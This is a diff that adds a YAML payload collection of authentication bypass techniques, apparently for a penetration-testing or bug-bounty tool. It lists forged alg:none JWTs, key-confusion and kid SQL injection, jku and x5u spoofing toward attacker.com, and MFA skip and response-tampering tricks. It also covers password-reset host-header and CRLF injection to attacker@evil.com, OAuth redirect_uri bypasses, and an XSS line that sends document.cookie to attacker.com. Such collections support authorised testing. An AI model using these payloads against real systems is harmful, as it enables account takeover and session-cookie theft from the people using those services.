@@ -1,0 +1,189 @@
+# auth-bypass.yaml — Authentication bypass techniques
+metadata:
+  version: "1.0"
+  sources:
+    - "AllAboutBugBounty/daffainfo"
+    - "PayloadsAllTheThings/JWT"
+    - "OWASP Authentication Cheat Sheet"
+    - "PortSwigger Authentication Labs"
+  last_updated: "2026-03-27"
+
+# ──────────────────────────────────────────────
+# JWT ATTACKS
+# ──────────────────────────────────────────────
+
+jwt_attacks:
+  - name: jwt_none_algorithm
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcxMTUwMDAwMH0."
+    context: "JWT-based auth where server accepts alg:none"
+    notes: "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}, Payload: {\"sub\":\"admin\"}. Remove signature. Try None, NONE, nOnE variants."
+
+  - name: jwt_none_variants
+    payload: "Change alg to: none, None, NONE, nOnE, NonE"
+    context: "When basic 'none' is rejected but case variations are not"
+    notes: "Some JWT libraries check alg case-sensitively against blacklist."
+
+  - name: jwt_hmac_rsa_confusion
+    payload: "Sign JWT with RS256 public key using HS256 algorithm"
+    context: "Server uses RS256 but accepts HS256. Public key is known (e.g., from /jwks.json or /.well-known/jwks.json)"
+    notes: "Change alg from RS256 to HS256. Sign with the public key as HMAC secret. Server verifies HMAC signature using same public key."
+
+  - name: jwt_weak_secret_bruteforce
+    payload: "hashcat -m 16500 jwt_token.txt -a 0 /usr/share/wordlists/rockyou.txt"
+    context: "JWT signed with weak HMAC secret"
+    notes: "Brute force the HMAC secret. Common secrets: secret, password, 123456, your_jwt_secret."
+
+  - name: jwt_kid_injection
+    payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"/dev/null\"}"
+    context: "JWT header with kid (key ID) parameter pointing to file"
+    notes: "kid points to /dev/null (empty file). Sign with empty string as secret. Also try kid SQL injection: kid: \"1' UNION SELECT 'secret' -- -\""
+
+  - name: jwt_jku_spoofing
+    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://attacker.com/.well-known/jwks.json\"}"
+    context: "JWT header with jku (JWK Set URL) that server fetches"
+    notes: "Point jku to attacker-controlled JWKS. Server fetches your public key and validates your forged token."
+
+  - name: jwt_x5u_spoofing
+    payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"x5u\":\"https://attacker.com/cert.pem\"}"
+    context: "JWT header with x5u (X.509 URL) parameter"
+    notes: "Similar to jku but uses X.509 certificate. Point to attacker-hosted cert."
+
+  - name: jwt_claim_manipulation
+    payload: "Modify claims: change 'role':'user' to 'role':'admin', change 'sub':'user123' to 'sub':'admin'"
+    context: "JWT with weak signature verification or after key compromise"
+    notes: "After bypassing signature check, modify claims for privilege escalation."
+
+# ──────────────────────────────────────────────
+# MFA BYPASS
+# ──────────────────────────────────────────────
+
+mfa_bypass:
+  - name: mfa_skip_step
+    payload: "After entering username/password, navigate directly to /dashboard or /account instead of /mfa-verify"
+    context: "MFA flow that relies on client-side enforcement"
+    notes: "If MFA check is only client-side, directly accessing post-MFA pages bypasses it."
+
+  - name: mfa_null_code
+    payload: "Submit MFA form with: code=null, code=, code=000000"
+    context: "MFA verification endpoint with weak input validation"
+    notes: "Null or empty values may satisfy the check. Try null, empty string, all zeros."
+
+  - name: mfa_code_reuse
+    payload: "Submit a valid MFA code multiple times"
+    context: "MFA that does not invalidate codes after use"
+    notes: "TOTP codes should be single-use. If not, replay captured codes."
+
+  - name: mfa_backup_code_bruteforce
+    payload: "Brute force 8-digit backup codes (10^8 = 100 million, but often only 10 codes generated)"
+    context: "MFA backup code endpoint without rate limiting"
+    notes: "If backup codes are short and endpoint has no rate limit, brute force is feasible."
+
+  - name: mfa_response_manipulation
+    payload: "Intercept MFA verify response, change {\"success\":false} to {\"success\":true}"
+    context: "Client-side MFA validation based on API response"
+    notes: "If frontend relies on response body to proceed, modify it with proxy."
+
+  - name: mfa_status_code_bypass
+    payload: "Intercept 401/403 response from MFA check and change to 200"
+    context: "MFA enforcement based on HTTP status code on client"
+    notes: "Change response status code in Burp/proxy to bypass client-side redirect."
+
+  - name: mfa_disable_via_api
+    payload: "PUT /api/users/me/mfa with body: {\"enabled\": false}"
+    context: "API endpoint to manage MFA settings without re-authentication"
+    notes: "Some APIs allow disabling MFA without requiring current MFA code."
+
+# ──────────────────────────────────────────────
+# PASSWORD RESET ABUSE
+# ──────────────────────────────────────────────
+
+password_reset:
+  - name: reset_token_in_response
+    payload: "POST /api/forgot-password with email=victim@target.com, check response body for reset token"
+    context: "Password reset endpoint that leaks token in API response"
+    notes: "Some APIs return the reset token in the response body or headers."
+
+  - name: reset_token_predictable
+    payload: "Request multiple reset tokens, analyze for sequential/time-based patterns"
+    context: "Password reset with weak token generation"
+    notes: "Tokens based on timestamp, sequential ID, or weak PRNG can be predicted."
+
+  - name: host_header_injection
+    payload: "POST /forgot-password with Host: attacker.com"
+    context: "Password reset email uses Host header to build reset link"
+    notes: "Reset email contains: https://attacker.com/reset?token=TOKEN. Victim clicks, attacker captures token."
+
+  - name: reset_email_parameter_injection
+    payload: "POST /forgot-password with email=victim@target.com%0acc:attacker@evil.com"
+    context: "Email parameter injection in password reset"
+    notes: "CRLF injection in email field adds CC header. Reset email sent to both addresses."
+
+  - name: reset_double_email
+    payload: "POST /forgot-password with body: {\"email\": [\"victim@target.com\", \"attacker@evil.com\"]}"
+    context: "Password reset accepting array of emails"
+    notes: "Server generates token for first email but sends to both."
+
+  - name: reset_token_no_expiry
+    payload: "Use old/expired reset tokens"
+    context: "Password reset tokens that never expire"
+    notes: "If tokens do not expire, leaked tokens from logs/emails remain valid indefinitely."
+
+# ──────────────────────────────────────────────
+# OAUTH ATTACKS
+# ──────────────────────────────────────────────
+
+oauth_attacks:
+  - name: oauth_redirect_uri_bypass
+    payload: "redirect_uri=https://target.com.attacker.com"
+    context: "OAuth flow with weak redirect_uri validation"
+    notes: "Subdomain matching bypass. Also try: redirect_uri=https://target.com@attacker.com, redirect_uri=https://target.com/.attacker.com"
+
+  - name: oauth_redirect_open_redirect
+    payload: "redirect_uri=https://target.com/redirect?url=https://attacker.com"
+    context: "OAuth combined with open redirect on target domain"
+    notes: "If target has an open redirect, chain it to leak the OAuth code/token."
+
+  - name: oauth_state_missing
+    payload: "Initiate OAuth flow without state parameter, use CSRF to force victim to complete attacker's flow"
+    context: "OAuth implementation that does not require or validate state parameter"
+    notes: "Missing state enables CSRF. Attacker initiates flow, victim completes it, attacker's account linked."
+
+  - name: oauth_scope_escalation
+    payload: "Modify scope parameter: scope=openid profile email admin"
+    context: "OAuth flow where scope is user-controllable"
+    notes: "Add additional scopes to the authorization request. Server may grant them."
+
+  - name: oauth_token_theft_via_referer
+    payload: "Link on callback page to attacker site, check Referer header for access_token in fragment"
+    context: "OAuth implicit flow with token in URL fragment"
+    notes: "If callback page has external links, token leaks via Referer header."
+
+# ──────────────────────────────────────────────
+# SESSION ATTACKS
+# ──────────────────────────────────────────────
+
+session_attacks:
+  - name: session_fixation
+    payload: "Set victim's session cookie to attacker-known value before login: Set-Cookie: session=ATTACKER_VALUE"
+    context: "Application that does not regenerate session ID after login"
+    notes: "Attacker sets session ID, victim logs in, attacker uses same session ID."
+
+  - name: session_cookie_no_httponly
+    payload: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
+    context: "XSS combined with cookies lacking HttpOnly flag"
+    notes: "Without HttpOnly, JavaScript can read session cookies."
+
+  - name: session_cookie_no_secure
+    payload: "Perform MITM on HTTP to capture session cookie"
+    context: "Session cookie without Secure flag on site accessible via HTTP"
+    notes: "Without Secure flag, cookie sent over HTTP. MITM captures it."
+
+  - name: session_concurrent_login
+    payload: "Login as victim on attacker device, check if victim's session is NOT invalidated"
+    context: "Application that allows unlimited concurrent sessions"
+    notes: "No session limit means stolen credentials give persistent access."
+
+  - name: session_id_in_url
+    payload: "Check URLs for: ?sessionid=, ?sid=, ?token=, ;jsessionid="
+    context: "Application that passes session identifiers in URL"
+    notes: "Session in URL leaks via Referer header, browser history, proxy logs."
